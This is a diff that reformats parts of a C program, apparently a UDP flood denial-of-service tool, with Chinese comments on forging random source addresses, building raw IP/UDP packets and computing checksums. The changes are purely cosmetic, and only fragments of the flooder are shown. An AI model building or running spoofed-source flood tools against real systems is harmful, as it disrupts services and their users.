@@ -26,7 +26,8 @@
 #define MAXCHILD (128)
 //#define K (1204)
 #define K (1024)
-#define DATUML (3*K)		//UDP数据部分长度
+//UDP数据部分长度
+#define DATUML (3*K)
 
 //DOS结构,分为IP头部、UDP头部、UDP数据部分
 struct dosseg_t{
@@ -56,7 +57,7 @@ static int alive = -1;
 //随机函数产生函数, 伪造原地址(由于系统的函数为伪随机函数, 因此每次用不同值进行初始化)
 static unsigned long myrandom(unsigned int begin, unsigned int end){
 	unsigned int uiTmp;
-	uiTmp =(unsigned int)( clock() % 2000 ) *( clock() % 2000 ) *( clock() % 1000 );
+	uiTmp = (unsigned int)( clock() % 2000 ) * ( clock() % 2000 ) * ( clock() % 1000 );
 	return (unsigned long)rand_r(&uiTmp) % end;
 }
 
@@ -65,7 +66,7 @@ static unsigned long myrandom(unsigned int begin, unsigned int end){
 //CRC16校验
 static unsigned short DoS_cksum(unsigned short *data, int length){
 	register int left = length;
-	register unsigned short *word = data;
+	register unsigned short* word = data;
 	register int sum = 0;
 	unsigned short ret = 0;
 
@@ -77,12 +78,12 @@ static unsigned short DoS_cksum(unsigned short *data, int length){
 
 	//如果为奇数,将最后一个字节单独计算,剩余的一个字节为高字节构建一个short类型变量值
 	if(left == 1){
-		*(unsigned char *)(&ret) = *(unsigned char *) word;
+		*(unsigned char*)(&ret) = *(unsigned char*) word;
 		sum += ret;
 	}
 
 	//折叠
-	sum =(sum >> 16) +(sum & 0xffff);
+	sum =(sum >> 16) + (sum & 0xffff);
 	sum +=(sum >> 16);
 
 	//取反
@@ -93,14 +94,14 @@ static unsigned short DoS_cksum(unsigned short *data, int length){
 
 
 static void DoS_udp(void){
-	//数据总长度
-	int tot_len = sizeof (struct ip) + sizeof (struct udphdr) + DATUML;
 	//发送目的地址
 	struct sockaddr_in to;
 	//DOS结构,分为IP头部、UDP头部、UDP数据部分
 	struct dosseg_t dosseg;
 	unsigned int tmp;
 	unsigned short buffer;
+	//数据总长度
+	int tot_len = sizeof (struct ip) + sizeof (struct udphdr) + DATUML;
 
 	//IP的版本,IPv4
 	dosseg.iph.ip_v = 4;
@@ -182,8 +183,8 @@ static void DoS_sig(int signo){
 
 
 int main(int argc, char *argv[]){
-	struct hostent * host = NULL;
-	struct protoent *protocol = NULL;
+	struct hostent* host = NULL;
+	struct protoent* protocol = NULL;
 	const char protoname[]= "icmp";
 
 	int i = 0;
